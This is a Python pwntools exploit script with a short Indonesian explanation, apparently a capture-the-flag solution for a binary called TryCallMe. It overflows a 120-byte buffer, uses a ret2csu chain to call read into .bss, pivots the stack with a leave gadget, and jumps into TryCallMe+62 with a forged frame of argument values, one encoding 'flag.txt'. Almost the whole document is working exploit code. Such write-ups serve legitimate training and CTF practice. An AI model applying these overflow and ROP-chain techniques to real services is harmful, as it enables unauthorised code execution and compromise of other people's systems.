"""
Untuk memanggil fungsi TryCallMe kita tidak perlu memakai gadget.
Jika diperhatikan di awal fungsi, semua nilai register yang berisi
argumen akan disimpan di stack dan akan dimuat kembali di register
saat akan digunakan. ini berarti kita dapat membuat seolah-olah
semua argumen telah disimpan di stack dan melakukan jump ke fungsi
TryCallMe setelah instruksi penyimpanan argumen di stack (TryCallMe+62).
"""

from pwn import *

b = ELF("./TryCallMe", checksec=False)

r = remote("0.0.0.0", 51707)

bss = 0x00404000
leave = 0x0040136a

## write() isi stack palsu ke .bss

p = b'a'*120
p += p64(b.symbols["__libc_csu_init"]+82) # rip -> csu+82

# ret2csu untuk memanggil write
p += p64(0x0)            # rbx -> index r15
p += p64(0x1)            # rbp
p += p64(0x0)            # r12 -> edi
p += p64(bss+0xa00-0x10) # r13 -> rsi
p += p64(0x100)          # r14 -> rdx
p += p64(b.got["read"])  # r15 -> GOT read
p += p64(b.symbols["__libc_csu_init"]+56) # ret -> csu+56

p += p64(0)              # padding -> add rsp, 8
p += p64(0x0)            # rbx
p += p64(bss+0xa00-0x10) # rbp -> rsp
p += p64(0x0)            # r12
p += p64(0x0)            # r13
p += p64(0x0)            # r14
p += p64(0x0)            # r15

p += p64(leave) # ret

r.send(p.ljust(0x100, b'\0'))

# Payload stack
# mov     [rbp-0x18], rdi
# movsd   [rbp-0x20], xmm0
# mov     [rbp-0x28], rsi
# movsd   [rbp-0x30], xmm1
# mov     [rbp-0x38], rdx
# movsd   [rbp-0x40], xmm2
# mov     [rbp-0x48], rcx
# movsd   [rbp-0x50], xmm3
# mov     [rbp-0x58], r8
# movsd   [rbp-0x60], xmm4
# mov     [rbp-0x68], r9
# movsd   [rbp-0x70], xmm5

p = b''
p += p64(bss+0xa70)
p += p64(b.symbols["TryCallMe"]+62) # ret
p += p64(0x7478742e67616c66) # [rbp-0x70], xmm5 -> 0x500
p += p64(0x0)                # [rbp-0x68], r9
p += p64(0x4052a1eb851eb852) # [rbp-0x60], xmm4
p += p64(0xD8CA444CC6C22E)   # [rbp-0x58], r8
p += p64(0x4058d33333333333) # [rbp-0x50], xmm3
p += p64(0x0)                # [rbp-0x48], rcx
p += p64(0x4054c8f5c28f5c29) # [rbp-0x40], xmm2
p += p64(0xb333f1ac485dffe9) # [rbp-0x38], rdx
p += p64(0x4057eb851eb851ec) # [rbp-0x30], xmm1
p += p64(0x4ccc0e53b7a20016) # [rbp-0x28], rsi
p += p64(0x4041ab851eb851ec) # [rbp-0x20], xmm0
p += p64(0xffffffffffffffff) # [rbp-0x18], rdi

r.sendline(p)

print(r.recvall())
r.close()